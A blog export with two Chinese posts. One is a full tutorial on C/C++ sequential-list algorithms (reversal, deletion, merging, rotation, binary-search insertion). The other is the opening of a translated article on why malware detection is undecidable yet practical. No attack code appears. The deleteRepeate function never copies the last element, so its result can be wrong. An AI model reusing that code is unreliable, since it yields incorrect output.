    <url>/2017/03/02/%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E7%BA%BF%E6%80%A7%E8%A1%A8%E6%93%8D%E4%BD%9C(%E6%8D%A1%E8%B5%B7%E6%88%91%E9%81%97%E5%BF%98%E5%A4%9A%E5%B9%B4%E7%9A%84c%E8%AF%AD%E8%A8%80)/</url>
    <content><![CDATA[<p>线性表是数据结构这门课程最开始讲的内容,也是平常写程序中最常用到得数据结构.下面就写一下一些有意思的线性表操作.</p>
<a id="more"></a>

<h3 id="线性表的定义"><a href="#线性表的定义" class="headerlink" title="线性表的定义"></a>线性表的定义</h3><p>在操作线性表之前,我先定义一下线性表的结构,方便之后看一些操作,阅读代码:</p>
<h4 id="线性表的数据结构定义"><a href="#线性表的数据结构定义" class="headerlink" title="线性表的数据结构定义"></a>线性表的数据结构定义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> *data;</span><br><span class="line">    <span class="keyword">int</span> length ;</span><br><span class="line"> &#125;List,*ListPoint;</span><br></pre></td></tr></table></figure>
<h4 id="线性表的基本操作"><a href="#线性表的基本操作" class="headerlink" title="线性表的基本操作"></a>线性表的基本操作</h4><p>初始化一个线性表</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initList</span><span class="params">(List &amp;<span class="built_in">list</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//初始化线性表</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">list</span>.data = <span class="keyword">new</span> <span class="keyword">int</span>[MAX_LENGTH];</span><br><span class="line">    srand(<span class="keyword">int</span>(time(<span class="number">0</span>)));</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">list</span>.data[i]=<span class="built_in">random</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">list</span>.length = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>打印一个线性表中的元素</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printList</span><span class="params">(List &amp;<span class="built_in">list</span>)</span></span>&#123;</span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">        打印自身 </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     <span class="keyword">int</span> i=<span class="number">0</span>; </span><br><span class="line">     <span class="built_in">cout</span>&lt;&lt;<span class="string">"the length of the list:"</span>&lt;&lt;<span class="built_in">list</span>.length&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">     <span class="built_in">cout</span>&lt;&lt;<span class="string">"the num of the list:"</span>;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">list</span>.length;i++)&#123;</span><br><span class="line">         <span class="built_in">cout</span>&lt;&lt;<span class="built_in">list</span>.data[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对线性表元素从小到大进行排序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sortList</span><span class="params">(List &amp;<span class="built_in">list</span>)</span></span>&#123;</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">      利用冒泡法对元素进行排序 </span></span><br><span class="line"><span class="comment">      从小到达排列 </span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="keyword">int</span> i,j;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="built_in">list</span>.length<span class="number">-1</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">       <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">         <span class="keyword">if</span>(<span class="built_in">list</span>.data[j]&gt;<span class="built_in">list</span>.data[j+<span class="number">1</span>])&#123;</span><br><span class="line">             <span class="built_in">list</span>.data[j] = <span class="built_in">list</span>.data[j+<span class="number">1</span>]^<span class="built_in">list</span>.data[j];</span><br><span class="line">             <span class="built_in">list</span>.data[j+<span class="number">1</span>] = <span class="built_in">list</span>.data[j+<span class="number">1</span>]^<span class="built_in">list</span>.data[j];</span><br><span class="line">             <span class="built_in">list</span>.data[j] = <span class="built_in">list</span>.data[j+<span class="number">1</span>]^<span class="built_in">list</span>.data[j];</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="具体的操作要求"><a href="#具体的操作要求" class="headerlink" title="具体的操作要求"></a>具体的操作要求</h3><h4 id="用空间复杂度为O-1-和时间复杂度为O-n-的算法-实现线性表的倒置"><a href="#用空间复杂度为O-1-和时间复杂度为O-n-的算法-实现线性表的倒置" class="headerlink" title="用空间复杂度为O(1),和时间复杂度为O(n)的算法,实现线性表的倒置"></a>用空间复杂度为O(1),和时间复杂度为O(n)的算法,实现线性表的倒置</h4><p>其实就是第一个与最后一个交换位置,第二个和倒数第二个交换位置:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">reverseList</span><span class="params">(List &amp;<span class="built_in">list</span>)</span></span>&#123;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         用空间复杂度为1的算法,实现list 倒置   </span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     <span class="keyword">if</span>(<span class="built_in">list</span>.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span> ;</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">int</span> i=<span class="number">0</span> ;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">list</span>.length/<span class="number">2</span>;i++)&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">          list.data[i] 与 list.data[list.length-1-i] 交换</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">         <span class="built_in">list</span>.data[i] = <span class="built_in">list</span>.data[i]^<span class="built_in">list</span>.data[<span class="built_in">list</span>.length<span class="number">-1</span>-i];</span><br><span class="line">         <span class="built_in">list</span>.data[<span class="built_in">list</span>.length<span class="number">-1</span>-i] = <span class="built_in">list</span>.data[i]^<span class="built_in">list</span>.data[<span class="built_in">list</span>.length<span class="number">-1</span>-i];</span><br><span class="line">         <span class="built_in">list</span>.data[i] = <span class="built_in">list</span>.data[i]^<span class="built_in">list</span>.data[<span class="built_in">list</span>.length<span class="number">-1</span>-i]; </span><br><span class="line"> </span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="用空复杂度为O-1-和时间复杂度为O-n-的算法-删除线性表所以值为x的元素"><a href="#用空复杂度为O-1-和时间复杂度为O-n-的算法-删除线性表所以值为x的元素" class="headerlink" title="用空复杂度为O(1)和时间复杂度为O(n)的算法,删除线性表所以值为x的元素"></a>用空复杂度为O(1)和时间复杂度为O(n)的算法,删除线性表所以值为x的元素</h4><p>从头开始遍历线性表,用pos记录当前的线性表的长度,如果当前扫描的元素值不是x,就将他加入到线性表中,并且pos+1,如果是x,就什么也不做.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">deleteList</span><span class="params">(List &amp;<span class="built_in">list</span>,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       在线性表中删除所有值为  x 的元素</span></span><br><span class="line"><span class="comment">       要求空间复杂度为 o(1) , 时间复杂度为 o(n)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">list</span>.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span> ;</span><br><span class="line">    <span class="keyword">int</span> pos=<span class="number">0</span>,i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">list</span>.length;i++)&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="built_in">list</span>.data[i]!=x)&#123;</span><br><span class="line">           <span class="built_in">list</span>.data[pos]=<span class="built_in">list</span>.data[i];</span><br><span class="line">           pos++;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">list</span>.length = pos;  <span class="comment">//更新一下线性表的长度</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="要求算法时间复杂度-O-n-空间复杂度-O-1-的算法删除有序的线性表中值位于-s-和-t之间的元素-包含s和t"><a href="#要求算法时间复杂度-O-n-空间复杂度-O-1-的算法删除有序的线性表中值位于-s-和-t之间的元素-包含s和t" class="headerlink" title="要求算法时间复杂度   O(n) 空间复杂度 O(1)的算法删除有序的线性表中值位于 s 和 t之间的元素.包含s和t"></a>要求算法时间复杂度   O(n) 空间复杂度 O(1)的算法删除有序的线性表中值位于 s 和 t之间的元素.包含s和t</h4><p>注意这里讲的是有序的表,那么值位于s和t之间的元素肯定是连在一起的<br>所以我们只需要找到第一个该删的元素,和最后一个该删的元素,就可以了 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">deleteListSection</span><span class="params">(List &amp;<span class="built_in">list</span>,<span class="keyword">int</span> s,<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       删除 有序表 list中 处于 s和t之间的元素,包含 s和t </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span>(s&gt;=t || <span class="built_in">list</span>.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span> ;</span><br><span class="line">    sortList(<span class="built_in">list</span>); <span class="comment">//先进行排序,然后再操作 </span></span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="built_in">list</span>.length<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>( (i&lt;<span class="built_in">list</span>.length) &amp;&amp; <span class="built_in">list</span>.data[i]&lt;s ) i++; <span class="comment">// 找到第一个需要删除的 </span></span><br><span class="line">    <span class="keyword">while</span>( j&gt;<span class="number">-1</span> &amp;&amp; <span class="built_in">list</span>.data[j]&gt;t) j--; <span class="comment">//找到最后一个要删除的元素</span></span><br><span class="line">    <span class="keyword">for</span>(j=j+<span class="number">1</span>;j&lt;<span class="built_in">list</span>.length;j++,i++)&#123;</span><br><span class="line">        <span class="built_in">list</span>.data[i] = <span class="built_in">list</span>.data[j];</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="built_in">list</span>.length = i;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="要求算法时间复杂度-O-n-空间复杂度-O-1-的算法删除无序的线性表值位于s和t之间的元素-包含s和t"><a href="#要求算法时间复杂度-O-n-空间复杂度-O-1-的算法删除无序的线性表值位于s和t之间的元素-包含s和t" class="headerlink" title="要求算法时间复杂度   O(n) 空间复杂度 O(1)的算法删除无序的线性表值位于s和t之间的元素,包含s和t"></a>要求算法时间复杂度   O(n) 空间复杂度 O(1)的算法删除无序的线性表值位于s和t之间的元素,包含s和t</h4><p>从头开始扫描顺序表,用 k 记录下在s 与 t 之间的个数(初始值 k=0) ,对于当前要扫描的元素 如果值不在 s和t之间,则前移 k 个位置 ,如果在 s和t之间 ,就 k++.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">deleteListSectionNoSort</span><span class="params">(List &amp;<span class="built_in">list</span>,<span class="keyword">int</span> s,<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">       删除顺序表中(无序的)  处于 s和t之间的元素  </span></span><br><span class="line"><span class="comment">       要求算法时间复杂度   O(n) 空间复杂度 O(1)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     <span class="keyword">if</span>(s&gt;=t || <span class="built_in">list</span>.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span> ;</span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">        从头开始扫描顺序表,用 k 记录下在s 与 t 之间的个数(初始值 k=0) ,对于当前要扫描的元素 </span></span><br><span class="line"><span class="comment">        如果值不在 s和t之间,则前移 k 个位置 ,如果在 s和t之间 ,就 k++ </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     <span class="keyword">int</span> i;</span><br><span class="line">     <span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">list</span>.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">list</span>.data[i]&gt;=s &amp;&amp; <span class="built_in">list</span>.data[i] &lt;=t)&#123;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">list</span>.data[i-k] = <span class="built_in">list</span>.data[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="built_in">list</span>.length = <span class="built_in">list</span>.length - k;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="literal">true</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="删除有序的顺序表中重复的元素-使剩下来的元素都不相同"><a href="#删除有序的顺序表中重复的元素-使剩下来的元素都不相同" class="headerlink" title="删除有序的顺序表中重复的元素,使剩下来的元素都不相同"></a>删除有序的顺序表中重复的元素,使剩下来的元素都不相同</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">deleteRepeate</span><span class="params">(List &amp;<span class="built_in">list</span>)</span></span>&#123;</span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">         在有序表中删除重复的元素,使剩下的元素都不相同 </span></span><br><span class="line"><span class="comment">         注意是有序表  </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     <span class="keyword">int</span> i ;</span><br><span class="line">     <span class="keyword">int</span> k=<span class="number">0</span> ;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">list</span>.length<span class="number">-1</span>;i++)&#123;</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span>(<span class="built_in">list</span>.data[i]==<span class="built_in">list</span>.data[i+<span class="number">1</span>])</span><br><span class="line">         &#123;</span><br><span class="line">              k++;</span><br><span class="line">         &#125; </span><br><span class="line">         <span class="keyword">else</span>&#123;</span><br><span class="line">              <span class="built_in">list</span>.data[i-k] = <span class="built_in">list</span>.data[i];</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   <span class="built_in">list</span>.length = <span class="built_in">list</span>.length - k ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第二种思路</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deleteRepeate_2</span><span class="params">(List &amp;<span class="built_in">list</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      删除有序表重复元素的第二种算法 </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>,j=<span class="number">1</span>;j&lt;<span class="built_in">list</span>.length;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">list</span>.data[i]!=<span class="built_in">list</span>.data[j]) &#123;</span><br><span class="line">            <span class="built_in">list</span>.data[++i] = <span class="built_in">list</span>.data[j] ; <span class="comment">// 注意是 先加再拷贝 </span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">list</span>.length = i+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="合并两个有序的顺序表到一个有序的顺序表中去"><a href="#合并两个有序的顺序表到一个有序的顺序表中去" class="headerlink" title="合并两个有序的顺序表到一个有序的顺序表中去"></a>合并两个有序的顺序表到一个有序的顺序表中去</h4><p>经典算法,应该都会</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">mergeList</span><span class="params">(List &amp;lista,List &amp;listb,List &amp;<span class="built_in">list</span>)</span></span>&#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">         合并两个有序的 顺序表到一个顺序表中.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">       <span class="keyword">if</span>(lista.length+listb.length&gt;MAX_LENGTH) <span class="keyword">return</span> <span class="literal">false</span> ;</span><br><span class="line">       <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,k=<span class="number">0</span> ;</span><br><span class="line">       <span class="keyword">while</span>(i&lt;lista.length&amp;&amp;j&lt;listb.length)&#123;</span><br><span class="line">          <span class="keyword">if</span>(lista.data[i]&lt;listb.data[j])</span><br><span class="line">             <span class="built_in">list</span>.data[k++]=lista.data[i++];</span><br><span class="line">          <span class="keyword">else</span> </span><br><span class="line">             <span class="built_in">list</span>.data[k++] = listb.data[j++];</span><br><span class="line">       &#125;</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">while</span>(i&lt;lista.length)</span><br><span class="line">         <span class="built_in">list</span>.data[k++] = lista.data[i++];</span><br><span class="line">     <span class="keyword">while</span>(j&lt;listb.length)</span><br><span class="line">         <span class="built_in">list</span>.data[k++] = listb.data[j++];</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">list</span>.length = lista.length+ listb.length ;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="在-一个-顺序表-A-m-n-中存放着两个线性表-a1-a2-a3-…-am-和-b1-b2-b3-…-bn-这里将-顺序表的前后位置互换-变为-b1-b2-b3-…-bn-和-a1-a2-a3-…-am"><a href="#在-一个-顺序表-A-m-n-中存放着两个线性表-a1-a2-a3-…-am-和-b1-b2-b3-…-bn-这里将-顺序表的前后位置互换-变为-b1-b2-b3-…-bn-和-a1-a2-a3-…-am" class="headerlink" title="在 一个 顺序表 A[m+n]中存放着两个线性表 (a1,a2,a3,…,am) 和 (b1,b2,b3,….bn) 这里将 顺序表的前后位置互换 ,变为  (b1,b2,b3,….bn)和 (a1,a2,a3,…,am)"></a>在 一个 顺序表 A[m+n]中存放着两个线性表 (a1,a2,a3,…,am) 和 (b1,b2,b3,….bn) 这里将 顺序表的前后位置互换 ,变为  (b1,b2,b3,….bn)和 (a1,a2,a3,…,am)</h4><p>参照前面 reverseList 的方法 ,先把 (a1,a2,a3…am)变为 (am,am-1,am-2,…a3,a2,a1) ,对b也进行这样的处理 , 顺序表就变为(am,am-1,…,a3,a2,a1)(bn,bn-1,bn-2,…,b3,b2,b1),  然后在对整体做一个倒置,就变为 (b1,b2,b3,…,bn)(a1,a2,a3,…,an)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">bool</span>  <span class="title">reverseListScope</span><span class="params">(List &amp;<span class="built_in">list</span>, <span class="keyword">int</span> left ,<span class="keyword">int</span> right)</span></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      这里的left right 都是顺序表的下标 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      实现把  (left,left+1,left+2...right) 变为 (right,...,left+2,left+1,left)  </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span>(left&gt;=right || right &gt;=<span class="built_in">list</span>.length)  <span class="keyword">return</span> <span class="literal">false</span> ;</span><br><span class="line">    <span class="keyword">int</span> mid = (left+right+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=left;i&lt;mid;i++)&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">          交换  list.data[i] 和 list.data[right-i+left]</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="built_in">list</span>.data[i] = <span class="built_in">list</span>.data[i]^<span class="built_in">list</span>.data[right-i+left];</span><br><span class="line">        <span class="built_in">list</span>.data[right-i+left] =  <span class="built_in">list</span>.data[i]^<span class="built_in">list</span>.data[right-i+left];</span><br><span class="line">        <span class="built_in">list</span>.data[i] = <span class="built_in">list</span>.data[i]^<span class="built_in">list</span>.data[right-i+left];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exchangeList</span><span class="params">(List &amp;<span class="built_in">list</span>,<span class="keyword">int</span> m ,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  reverseListScope(<span class="built_in">list</span>,<span class="number">0</span>,m<span class="number">-1</span>);</span><br><span class="line">  reverseListScope(<span class="built_in">list</span>,m,m+n<span class="number">-1</span>);</span><br><span class="line">  reverseListScope(<span class="built_in">list</span>,<span class="number">0</span>,m+n<span class="number">-1</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="用最短的时间在有序的顺序表中找到元素x-如果找到-就让其与与他后面的那个元素交换位置-如果没有找到-就把他插入到合适位置-保持顺序表递增有序"><a href="#用最短的时间在有序的顺序表中找到元素x-如果找到-就让其与与他后面的那个元素交换位置-如果没有找到-就把他插入到合适位置-保持顺序表递增有序" class="headerlink" title="用最短的时间在有序的顺序表中找到元素x,如果找到 ,就让其与与他后面的那个元素交换位置,如果没有找到,就把他插入到合适位置,保持顺序表递增有序"></a>用最短的时间在有序的顺序表中找到元素x,如果找到 ,就让其与与他后面的那个元素交换位置,如果没有找到,就把他插入到合适位置,保持顺序表递增有序</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">searchExchangeInsert</span><span class="params">(List &amp;<span class="built_in">list</span>,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> low=<span class="number">0</span>,high = <span class="built_in">list</span>.length<span class="number">-1</span>,mid; </span><br><span class="line">    <span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">     mid = (low+high)/<span class="number">2</span>;</span><br><span class="line">     <span class="keyword">if</span>(<span class="built_in">list</span>.data[mid]==x) <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">if</span>(<span class="built_in">list</span>.data[mid]&lt;x) low =  mid+<span class="number">1</span>;</span><br><span class="line">     <span class="keyword">if</span>(<span class="built_in">list</span>.data[mid]&gt;x) high = mid<span class="number">-1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     如果存在 ,且不是 最后一个 ,则与他后面一个位置互换</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">list</span>.data[mid]==x &amp;&amp; mid!= <span class="built_in">list</span>.length<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="comment">//  list.data[mid] 和 list.mid[i+1] 互换 </span></span><br><span class="line">        <span class="built_in">list</span>.data[mid] = <span class="built_in">list</span>.data[mid]^<span class="built_in">list</span>.data[mid+<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">list</span>.data[mid+<span class="number">1</span>] = <span class="built_in">list</span>.data[mid]^<span class="built_in">list</span>.data[mid+<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">list</span>.data[mid] = <span class="built_in">list</span>.data[mid]^<span class="built_in">list</span>.data[mid+<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(low&gt;high)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="built_in">list</span>.length<span class="number">-1</span>;i&gt;high;i--)&#123;</span><br><span class="line">            <span class="built_in">list</span>.data[i+<span class="number">1</span>]=<span class="built_in">list</span>.data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">list</span>.data[i+<span class="number">1</span>] = x; </span><br><span class="line">        <span class="built_in">list</span>.length++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="用空间和时间复杂度最低的算法-实现顺序表循环左移-n-位"><a href="#用空间和时间复杂度最低的算法-实现顺序表循环左移-n-位" class="headerlink" title="用空间和时间复杂度最低的算法,实现顺序表循环左移 n 位"></a>用空间和时间复杂度最低的算法,实现顺序表循环左移 n 位</h4><p>例如 1234 循环左移2位,其实就是 3412,其实前面已经写过了,只是参数不太一样<br>我们可以将 12 变为 逆序变为 21,然后 34 逆序变为43,再把整体 2143 逆序,就变为 3412 了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shiftLeft</span><span class="params">(List &amp;<span class="built_in">list</span>,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">     </span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">        将顺序表循环左移 n 位 </span></span><br><span class="line"><span class="comment">        例如 1234 循环左移2位,其实就是 3412 </span></span><br><span class="line"><span class="comment">        其实前面已经写过了 </span></span><br><span class="line"><span class="comment">        我们可以将 12 变为 逆序变为 21,然后 34 逆序变为43,再把整体 2143 逆序,就变为 3412 了  </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//  跟exchangeList 实现的功能一样 </span></span><br><span class="line">  reverseListScope(<span class="built_in">list</span>,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">  reverseListScope(<span class="built_in">list</span>,n,<span class="built_in">list</span>.length<span class="number">-1</span>);</span><br><span class="line">  reverseListScope(<span class="built_in">list</span>,<span class="number">0</span>,<span class="built_in">list</span>.length<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>代码控</category>
      </categories>
      <tags>
        <tag>c</tag>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title>恶意代码难以检测的真正原因</title>
    <url>/2023/10/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%9A%BE%E4%BB%A5%E6%A3%80%E6%B5%8B%E7%9A%84%E7%9C%9F%E6%AD%A3%E5%8E%9F%E5%9B%A0/</url>
    <content><![CDATA[<blockquote>
<p>原文地址: <a href="https://www.gdatasoftware.com/blog/2022/06/37445-malware-detection-is-hard" target="_blank" rel="noopener">https://www.gdatasoftware.com/blog/2022/06/37445-malware-detection-is-hard</a></p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>科研人员开发的人工智能检测引擎具有98% 的恶意软件检测率和5% 的假阳性率。如果您认为这是一种非常好的防病毒软件技术，那么本文可能会改变您的想法。</p>
<a id="more"></a>

<h2 id="恶意软件检测不能被彻底解决，但是并不是不切实际的"><a href="#恶意软件检测不能被彻底解决，但是并不是不切实际的" class="headerlink" title="恶意软件检测不能被彻底解决，但是并不是不切实际的"></a>恶意软件检测不能被彻底解决，但是并不是不切实际的</h2><p><a href="https://web.eecs.umich.edu/~aprakash/eecs588/handouts/cohen-viruses.html" target="_blank" rel="noopener">Fred Cohen</a> 在 1984 年已经证明了病毒检测是一个不可解问题。他假设存在一个完美的病毒检测程序是存在的，然后他构造了一个潜在的病毒，它仅在完美的检测程序认为它是干净的时才有感染性，所以这个完美的检测程序不能提供正确的检测结果，所以这个并不是一个完美的病毒检测程序。由于所有病毒都是恶意软件，因此可以为恶意软件检测构造类似的反证法证明这个完美的恶意代码检测程序是不存在的。</p>
<p>但是，在数学意义上的”不可解”并不意味着它没有实际的解决方案。一个不可解问题是不能在所有情况下提供正确的答案的决策问题。因此，如果您有一个程序，可以正确回答 99.9999% 的情况，但是 0.0001% 的情况回答错误，那么这个问题可能同时是不可解的和仍然实际可行的。我们已经有足够的解决方案来解决类似的问题。一个例子是<a href="https://en.wikipedia.org/wiki/Travelling_salesman_problem" target="_blank" rel="noopener">旅行商</a>问题，它在物流的包裹路由系统或电路制造过程中具有应用。尽管尚未发现任何可以在合理时间内解决旅行商问题的算法（它是 NP-hard），但有足够的近似解决方案来计算包裹递送的路线。</p>
<p>同样适用于防病毒产品，它们尽可能最好地保护系统免受恶意软件的攻击。但是与包裹收件人不同，恶意软件开发人员正在积极试图以使防病毒产品做错决策并不检测这些程序的方式创建恶意软件。这类似于人们故意和不断试图找到包裹交付路由输入，这些输入在合理时间内没有得到最佳解决。</p>
